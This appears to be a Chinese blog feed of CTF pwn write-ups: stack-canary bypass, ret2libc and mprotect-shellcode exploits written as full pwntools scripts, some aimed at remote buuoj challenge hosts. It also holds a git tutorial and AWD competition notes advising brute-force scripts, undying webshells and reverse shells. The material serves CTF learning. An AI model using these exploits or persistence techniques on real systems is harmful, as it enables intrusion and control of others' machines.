    <content type="html"><![CDATA[<p>查看main</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003852267.png" srcset="/img/loading.gif" class="" title="image-20191223003852267"><p>进入test()</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003835308.png" srcset="/img/loading.gif" class="" title="image-20191223003835308"><p>看见了read，等等先</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005942680.png" srcset="/img/loading.gif" class="" title="image-20191223005942680"><p>judge无法反编译，查看汇编</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005319299.png" srcset="/img/loading.gif" class="" title="image-20191223005319299"><p>看见了xor rdx,[rbp-8]，以及上图的mov rdx, [rdx] 也就是先讲rdx指针里的数值放在rdx里，再将rdx和rbp-8的那个进行异或，一致则校验成功</p><p>点开read的buf</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005537590.png" srcset="/img/loading.gif" class="" title="image-20191223005537590"><p>buf只有30字节</p><p>再看看strings</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011138209.png" srcset="/img/loading.gif" class="" title="image-20191223011138209"><p>没有/bin/sh</p><p>所以我们得先绕过栈校验，再leak libc地址，然后再system /bin/sh</p><p>遂写poc</p><pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])pause()sh.sendline(payload)sh.interactive()</code></pre><blockquote><p>ldd my_cannary 读取libc</p><p>获得pop_rdi_ret 地址</p><pre><code class="shell">ROPgadget --binary pwn-100 --only &quot;pop|ret&quot; | grep &quot;rdi&quot;</code></pre></blockquote><p>这里使用got表的exit来放在cannary上，pause之后打开edb调试</p>{% asset_img image-20191223010439895.png image-20191223010439895 %}<p>运行到这可以看见rdx值为 0x601058 [rdx] = 0x4006f6</p><p>payload += p64(0x4006f6)</p>{% asset_img image-20191223010623917.png image-20191223010623917 %}<p>这样 rdx 和 [rbp-8] 的值就一样了，异或就为0</p><p>随后</p><p>payload += p64(pop_rdi_ret)<br>payload += p64(start_main)</p><p>测试是否能return to main</p>{% asset_img image-20191223011050308.png image-20191223011050308 %}<p>可以之后，我们再在pop_rdi_ret之后调用puts 打印libc地址 再return to main函数</p><pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += p64(pop_rdi_ret)payload += p64(__libc_start_main)payload += p64(elf.plt[&#39;puts&#39;])payload += p64(start_main)pause()sh.sendline(payload)sh.interactive()</code></pre><p>直接运行，报错，也没有打印lbc，打开edb看</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011616461.png" srcset="/img/loading.gif" class="" title="image-20191223011616461"><p>这是啥地址，添加log输出之后</p><pre><code class="python">log.success(&quot;pop_rdi_ret====&gt;&quot; + hex(pop_rdi_ret))log.success(&quot;put_plt====&gt;&quot; + hex(elf.plt[&#39;puts&#39;]))log.success(&quot;__libc_start_main====&gt;&quot; + hex(__libc_start_main))log.success(&quot;start_main=====&gt;&quot; + hex(start_main))</code></pre><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011833341.png" srcset="/img/loading.gif" class="" title="image-20191223011833341">发现咋跳转到了libc_start_main地址上，本应跳转到pop_rdi_ret的。偏移可能有问题<pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += cyclic(20) #计算20个来看偏移payload += p64(pop_rdi_ret)payload += p64(__libc_start_main)payload += p64(elf.plt[&#39;puts&#39;])payload += p64(start_main)log.success(&quot;pop_rdi_ret====&gt;&quot; + hex(pop_rdi_ret))log.success(&quot;put_plt====&gt;&quot; + hex(elf.plt[&#39;puts&#39;]))log.success(&quot;__libc_start_main====&gt;&quot; + hex(__libc_start_main))log.success(&quot;start_main=====&gt;&quot; + hex(start_main))pause()sh.sendline(payload)sh.interactive()</code></pre><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012131411.png" srcset="/img/loading.gif" class="" title="image-20191223012131411"><p>这样就看见了，然后<code>cyclic -l 0x61616163</code>计算得8 </p><p>遂将cyclic20的修改为8 payload += cyclic(8)</p> <img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012338855.png" srcset="/img/loading.gif" class="" title="image-20191223012338855"><p>这样就打印出一堆乱码了，然后写代码接收libc_start_main，计算system和binsh</p><p>Exp</p><pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += cyclic(8)payload += p64(pop_rdi_ret)payload += p64(__libc_start_main)payload += p64(elf.plt[&#39;puts&#39;])payload += p64(start_main)log.success(&quot;pop_rdi_ret====&gt;&quot; + hex(pop_rdi_ret))log.success(&quot;put_plt====&gt;&quot; + hex(elf.plt[&#39;puts&#39;]))log.success(&quot;__libc_start_main====&gt;&quot; + hex(__libc_start_main))log.success(&quot;start_main=====&gt;&quot; + hex(start_main))pause()sh.sendline(payload)__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))log.success(&quot;__libc_start_main=====&gt;&quot; + hex(__libc_start_main))libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]system = libc + lib.symbols[&#39;system&#39;]binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += cyclic(8)payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)sh.recvuntil(&quot;begin&quot;)sh.sendline(payload)sh.interactive()</code></pre><p>ubuntu18如果运行无法拿shell</p><pre><code>payload += p64(binsh)payload += p64(system + 0x1b)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git同步到github和gitee</title>
    <link href="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/"/>
    <url>/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/</url>
    
    <content type="html"><![CDATA[<p>==按照此说明做下来保证可用，但我也还没完全研究透彻所以有诸多不足请多原谅==</p><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><h2 id="1、建立一个仓库"><a href="#1、建立一个仓库" class="headerlink" title="1、建立一个仓库"></a>1、建立一个仓库</h2><p><a href="https://gitee.com/" target="_blank" rel="noopener">https://gitee.com/</a></p><img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802193737452.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"><h2 id="2、下载git"><a href="#2、下载git" class="headerlink" title="2、下载git"></a>2、下载git</h2><p><a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a><br>可以跟随这个 <a href="https://blog.csdn.net/sishen47k/article/details/80211002" target="_blank" rel="noopener">https://blog.csdn.net/sishen47k/article/details/80211002</a> 安装</p><h1 id="二、开始操作"><a href="#二、开始操作" class="headerlink" title="二、开始操作"></a>二、开始操作</h1><h2 id="1、创建SSHkey"><a href="#1、创建SSHkey" class="headerlink" title="1、创建SSHkey"></a>1、创建SSHkey</h2><p>打开Git Bash，输入<code>ssh-keygen -t rsa</code><br>会分别提示你文件名，密码（可不设置），确认密码。一般三次回车就可以<br>在 C:\Users\“你的用户名”.ssh 目录下就会有.pub结尾的文件，用记事本打开，复制里面的东西，这就是你的SSH key</p><h2 id="2、添加key到Gitee"><a href="#2、添加key到Gitee" class="headerlink" title="2、添加key到Gitee"></a>2、添加key到Gitee</h2><p>gitee-&gt;设置-&gt;SSH公钥<br>把key粘贴进去，标题默认是本机的名字</p><h2 id="3、git连接到gitee"><a href="#3、git连接到gitee" class="headerlink" title="3、git连接到gitee"></a>3、git连接到gitee</h2><h3 id="https连接"><a href="#https连接" class="headerlink" title="https连接"></a>https连接</h3><p>拷贝下来你仓库的链接，如 <a href="https://gitee.com/xxxxx" target="_blank" rel="noopener">https://gitee.com/xxxxx</a><br>然后在你想同步的文件夹上右键<img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802195801320.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"><br>点击GIt Bash Here，输入</p><pre><code>git initgit remote add origin https://gitee.com/xxxxx</code></pre><p>add origin的origin是给他的一个命名<br>然后设置config，分别设置名字和邮箱</p><pre><code>git config --global user.name &quot;Your Name&quot;git config --global user.email &quot;you@example.com&quot;</code></pre><h3 id="ssh链接-推荐"><a href="#ssh链接-推荐" class="headerlink" title="ssh链接 ==推荐=="></a>ssh链接 ==推荐==</h3><pre><code>$ssh -T git@gitee.comHi XXX! You&#39;ve successfully authenticated, but GITEE.COM does not provide shell access.</code></pre><p>则代表ssh链接成功</p><pre><code>git remote add gitee git@gitee.com:YourUserName/YourProjectName.git</code></pre><p>YourUserName和YourProjectName都是要具体看你自己的实际用户名和仓库名字<br>即可，可以通过<code>git remote -v</code>查看</p><p>添加你的文件<code>git add .</code></p><pre><code>git commit -m &quot;备注&quot;</code></pre><p>推送 <code>git push origin/gitee master</code><br>拉取 <code>git pull origin/gitee master</code> ==使用origin或者gitee取决于你给他的命名==</p><p>==这里的master应该也可以换成develop分支上传==</p><p>深入理解github模式请戳 <a href="https://blog.csdn.net/weixin_33547926/article/details/78545042" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33547926/article/details/78545042</a></p><h1 id="3、再次更新之后如何同步"><a href="#3、再次更新之后如何同步" class="headerlink" title="3、再次更新之后如何同步"></a>3、再次更新之后如何同步</h1><pre><code>git statusgit add -Agit commit -a -m &quot;备注&quot;git push origin/gitee master -f</code></pre><h1 id="4、取消暂存"><a href="#4、取消暂存" class="headerlink" title="4、取消暂存"></a>4、取消暂存</h1><pre><code>git statusgit reset filename</code></pre><h1 id="使用VScode更新"><a href="#使用VScode更新" class="headerlink" title="使用VScode更新"></a>使用VScode更新</h1><p>==先保存文件，再暂存更改，随后拉取（pull），即可提交。提交完后再推送到（push）==</p><img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190803083016935.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述">]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_n_1 WP</title>
    <link href="/2020/01/13/ciscn_2019_n_1%20WP/"/>
    <url>/2020/01/13/ciscn_2019_n_1%20WP/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-n-1-WP"><a href="#ciscn-2019-n-1-WP" class="headerlink" title="ciscn_2019_n_1 WP"></a>ciscn_2019_n_1 WP</h1><pre><code class="c">int func(){  int result; // eax  char v1; // [rsp+0h] [rbp-30h]  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts(&quot;Let&#39;s guess the number.&quot;);  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system(&quot;cat /flag&quot;);  else    result = puts(&quot;Its value should be 11.28125&quot;);  return result;}</code></pre><p>看见==我还尝试了一下’a’ * offset + ‘11.28215’……</p><p>然后南梦一句：这不是有gets，你直接跳system不就好了。。。。</p><p>哎</p><p>exp</p><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;#sh = process(&quot;./ciscn_2019_n_1&quot;)sh = remote(&quot;node3.buuoj.cn&quot;,25925)elf = ELF(&quot;./ciscn_2019_n_1&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)sh.recvuntil(&quot;er.&quot;)binsh = 0x04006BEpayload = &quot;a&quot; * 56 payload += p64(binsh)sh.sendline(payload)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="/2020/01/13/get_started_3dsctf_2016/"/>
    <url>/2020/01/13/get_started_3dsctf_2016/</url>
    
    <content type="html"><![CDATA[<h1 id="二进制菜鸡的小窝的WP"><a href="#二进制菜鸡的小窝的WP" class="headerlink" title="二进制菜鸡的小窝的WP"></a><a href="http://www.b1ndsec.cn/" target="_blank" rel="noopener">二进制菜鸡的小窝</a>的WP</h1><p>mprotect函数原型： int mprotect(void *addr, size_t len, int prot);</p><p>addr 内存启始地址</p><p>len 修改内存的长度</p><p>prot 内存的权限</p><p>[<img src="/2020/01/13/get_started_3dsctf_2016/A7DNJ_MC7NXWW8JVZG.png" srcset="/img/loading.gif" class="" title="img"></p><p>所以得到exp:</p><pre><code class="python"># _*_ coding:utf-8 _*_from pwn import *elf = ELF(&#39;./get_started_3dsctf_2016&#39;)sh = elf.process()#sh = remote(&#39;node3.buuoj.cn&#39;,27037)pop3_ret = 0x804951D #为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.mem_addr = 0x80EB000 #可读可写的内存,但不可执行mem_size = 0x1000 #通过调试出来的值mem_proc = 0x7 #可代表可读可写可执行mprotect_addr = elf.symbols[&#39;mprotect&#39;]read_addr = elf.symbols[&#39;read&#39;]payload_01 = &#39;A&#39; * 0x38payload_01 += p32(mprotect_addr)payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12#mprotect 的三个参数payload_01 += p32(mem_addr) #mprotect函数参数1 修改的内存地址payload_01 += p32(mem_size) #mprotect函数参数2 修改的内存大小payload_01 += p32(mem_proc) #mprotect函数参数3 修改的权限payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址payload_01 += p32(pop3_ret) #执行完read后将返回到pop3_ret指令,又继续使esp+12#read 的三个参数payload_01 += p32(0) #read函数参数1 ,从输入端读取payload_01 += p32(mem_addr) #读取到的内容复制到指向的内存里payload_01 += p32(0x100) #读取大小payload_01 += p32(mem_addr) #执行完read后ret esish.sendline(payload_01)payload_sh = asm(shellcraft.sh(),arch = &#39;i386&#39;, os = &#39;linux&#39;)sh.sendline(payload_sh)sh.interactive()</code></pre><p>来源：<a href="https://www.b1ndsec.cn/?p=371" target="_blank" rel="noopener">https://www.b1ndsec.cn/?p=371</a></p><h2 id="LYXF-Logan-的WP"><a href="#LYXF-Logan-的WP" class="headerlink" title="LYXF-Logan 的WP"></a><a href="https://www.cnblogs.com/lyxf/" target="_blank" rel="noopener">LYXF-Logan</a> 的WP</h2><pre><code> 修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.首先按先说一下mprotect函数:原型如下int mprotect(void *addr, size_t len, int prot);addr 内存启始地址len  修改内存的长度prot 内存的权限要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或$ ./ get_started_3dsctf_2016 &amp;$ cat /proc/[you_pid]/maps 查看内存区域可以查看到,内存可读可写的地址为: 0x0x80EB000 ,所以我们对该内存进行增加一个权限如何进行内存的权限修改,思路:1.栈溢出ret 到 mprotect函数地址,我来解释一下 call 指令, call = push + jmp所以直接ret后要留一个返回地址,因为ret 就相当于 jmp 到 mprotect,为了完整的回来,所以在mprotect地址后在压入一个返回地址.2.在32为系统中传参是使用栈传参,择第一个参数先push,第二个再push....所以基本的payload可以构思如下:payload = &#39;A&#39; + 0x38 + p32(mprotect_addr)payaloda += p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)这里的mprotect_addr就是我们要跳转到mprotect函数的地址ret_addr 为 mprotect函数执行完后的地址.argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (edb-debuger查看得到)argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.使用 ROPgadget --binary get_started_3dsctf_2016 --only &#39;pop|ret&#39; | grep pop存在pop的一些指令地址,可以发现:0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret那我们就得到了该地址.上面的ret_addr就填写0x0804f460好下面我们就要构思如何将自己的shellcode写入内存再执行,使用read函数写入.read函数原型:ssize_t read(int fd, void *buf, size_t count);fd 设为0时就可以从输入端读取内容buf 设为我们想要执行的内存地址size 适当大小就可以...................</code></pre><h4 id="最终exp如下"><a href="#最终exp如下" class="headerlink" title="最终exp如下:"></a>最终exp如下:</h4><pre><code># _*_ coding:utf-8 _*_from pwn import *elf = ELF(&#39;./get_started_3dsctf_2016&#39;)sh = elf.process()sh = remote(&#39;node3.buuoj.cn&#39;, 28576)pop3_ret = 0x804951D&#39;&#39;&#39;pop esipop edipop ebp&#39;&#39;&#39;esi = 0x80EB000 #可读可写的内存,但不可执行edi = 0x1000    #通过调试出来的值ebp = 0x7       #可代表可读可写可执行mprotect_addr = elf.symbols[&#39;mprotect&#39;]read_addr = elf.symbols[&#39;read&#39;]&#39;&#39;&#39;为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.&#39;&#39;&#39;payload_01 = &#39;A&#39; * 0x38payload_01 += p32(mprotect_addr)payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12#mprotect 的三个参数payload_01 += p32(esi)   #mprotect函数参数1 修改的内存地址payload_01 += p32(edi)   #mprotect函数参数2 修改的内存大小payload_01 += p32(ebp)   #mprotect函数参数3 修改的权限payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址payload_01 += p32(pop3_ret)  #执行完read后将返回到pop3_ret指令,又继续使esp+12#read 的三个参数payload_01 += p32(0)     #read函数参数1 ,从输入端读取payload_01 += p32(esi)   #读取到的内容复制到指向的内存里payload_01 += p32(0x100) #读取大小payload_01 += p32(esi)   #执行完read后ret esish.sendline(payload_01)payload_sh = asm(shellcraft.sh(),arch = &#39;i386&#39;, os = &#39;linux&#39;) sh.sendline(payload_sh)sh.interactive()</code></pre><p><a href="http://www.bubuko.com/infodetail-3355135.html" target="_blank" rel="noopener">get_started_3dsctf_2016-Pwn</a></p><p>标签：<a href="http://www.bubuko.com/so/1/active" target="_blank" rel="noopener">active</a>  <a href="http://www.bubuko.com/so/1/bin" target="_blank" rel="noopener">bin</a>  <a href="http://www.bubuko.com/so/1/lag" target="_blank" rel="noopener">lag</a>  <a href="http://www.bubuko.com/so/1/大小" target="_blank" rel="noopener">大小</a>  <a href="http://www.bubuko.com/so/1/art" target="_blank" rel="noopener">art</a>  <a href="http://www.bubuko.com/so/1/ger" target="_blank" rel="noopener">ger</a>  </p><p>原文：<a href="https://www.cnblogs.com/lyxf/p/12113401.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu-ciscn_2019-c_1 WP</title>
    <link href="/2020/01/13/buu-ciscn_2019-c_1%20WP/"/>
    <url>/2020/01/13/buu-ciscn_2019-c_1%20WP/</url>
    
    <content type="html"><![CDATA[<h1 id="buu-ciscn-2019-c-1-WP"><a href="#buu-ciscn-2019-c-1-WP" class="headerlink" title="buu-ciscn_2019-c_1 WP"></a>buu-ciscn_2019-c_1 WP</h1><pre><code class="c">// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&amp;argc, argv, envp);  puts(&quot;EEEEEEE                            hh      iii                &quot;);  puts(&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;);  puts(&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;);  puts(&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;);  puts(&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;);  puts(&quot;====================================================================&quot;);  puts(&quot;Welcome to this Encryption machine\n&quot;);  begin();  while ( 1 )  {    while ( 1 )    {      fflush(0LL);      v4 = 0;      __isoc99_scanf(&quot;%d&quot;, &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts(&quot;I think you can do it by yourself&quot;);      begin();    }    if ( v4 == 3 )    {      puts(&quot;Bye!&quot;);      return 0;    }    if ( v4 != 1 )      break;    encrypt();    begin();  }  puts(&quot;Something Wrong!&quot;);  return 0;}int begin(){  puts(&quot;====================================================================&quot;);  puts(&quot;1.Encrypt&quot;);  puts(&quot;2.Decrypt&quot;);  puts(&quot;3.Exit&quot;);  return puts(&quot;Input your choice!&quot;);}int encrypt(){  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts(&quot;Input your Plaintext to be encrypted&quot;);  gets(s);  while ( 1 )  {    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= 96 || s[x] &gt; 122 )    {      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      {        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xFu;      }      else      {        s[x] ^= 0xEu;      }    }    else    {      s[x] ^= 0xDu;    }    ++x;  }  puts(&quot;Ciphertext&quot;);  return puts(s);}</code></pre><p>发现gets(s);这样就好办了，随后那个加密就不用管了。</p><p>看看程序里边有无system(“\bin\sh”)</p><p>![image-20191215140307281](buu-ciscn_2019-c_1 WP/image-20191215140307281.png)</p><p>没有，那就只能通过libc来计算了</p><p>我们知道了lib，有了puts函数，所以我们可以leak libc的起始地址，计算libc地址，此时system和binsh都是嵌入到了内存当中的，所以我们就加上偏移即可调用</p><p>exp</p><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;sh = process(&quot;./ciscn_2019_c_1&quot;)#sh = remote(&quot;node3.buuoj.cn&quot;,25817)elf = ELF(&quot;./ciscn_2019_c_1&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) #ida里可以看见sh.recvuntil(&quot;!&quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;ted&quot;)offset = 87 #ida双击gets(s)看得是0x50，加上前面的\x00就是80+8pop_rdi_ret = elf.search(asm(&quot;pop rdi\nret\n&quot;)).next()payload = &#39;\x00&#39; + offset * &quot;a&quot;payload += p64(pop_rdi_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(elf.plt[&#39;puts&#39;])payload += p64(0x400B28) #程序起始地址sh.sendline(payload)sh.recvuntil(&quot;Ciphertext&quot;)__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]system = libc + lib.symbols[&#39;system&#39;]binsh = libc + lib.search(&quot;/bin/sh\x00&quot;).next()sh.recvuntil(&quot;!&quot;)sh.sendline(&quot;1&quot;)payload = &#39;\x00&#39; + offset * &quot;a&quot;payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system + 0x1b )payload += p64(0xdeadbeef)sh.sendline(payload)log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD准备</title>
    <link href="/2020/01/13/AWD%E5%87%86%E5%A4%87/"/>
    <url>/2020/01/13/AWD%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="探测主机"><a href="#探测主机" class="headerlink" title="探测主机"></a>探测主机</h2><p>Nmap或HTTPScan</p><p>Nmap扫描端口</p><h2 id="端口攻击"><a href="#端口攻击" class="headerlink" title="端口攻击"></a>端口攻击</h2><p>常见：22，2389，1443，3306</p><p>==准备爆破脚本！！！==</p><h2 id="WEB攻击"><a href="#WEB攻击" class="headerlink" title="WEB攻击"></a>WEB攻击</h2><blockquote><p>Web 方面的语言多为 PHP，小部分为 Java 和 Python。这里的 Web 环境分两种情况，一种是已有漏洞的框架，一种是出题人写的框架。</p><p>如果是已有漏洞的框架，通常会比较明显。比如说 Struts 2 各种漏洞等等，用工具扫就可以扫出来。这个需要准备得比较充分，在电脑中备好 EXP 库、漏洞库和各种扫描工具库，以便能够快速利用比较明显的漏洞。总之手要快！</p><p>如果是出题人出的框架，常用并且简单有效的做法是把整站源码下载下来，直接用工具审计。以 PHP 举例，一般的流程是先D盾查杀，发现有带有预留后门或者 Webshell 马上报给防守队友进行加固。</p><p>把后门的问题搞定、防止别人快速拿分后，其次才是源码审计，发现问题点后迅速验证，报给防守队友，并且开始写攻击脚本。以 PHP 举例，一般是使用 Seay 等源码审计工具，审核出比较明显的漏洞。</p><p>完成了工具扫描后，开始常规的渗透测试，比如说文件上传、SQL 注入等等，看是否能绕过，找到一个点马上写利用脚本。<br>————————————————<br>版权声明：本文为CSDN博主「neversec」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_35912913/article/details/89336506" target="_blank" rel="noopener">https://blog.csdn.net/github_35912913/article/details/89336506</a></p></blockquote><h2 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h2><p>AWD优先种不死马，反弹shell</p><blockquote><p>不死马：不断在该路径生成shell，用于工具连接</p></blockquote><pre><code>find / -name *flag*grep -rn &quot;flag&quot; *</code></pre><h2 id="防守"><a href="#防守" class="headerlink" 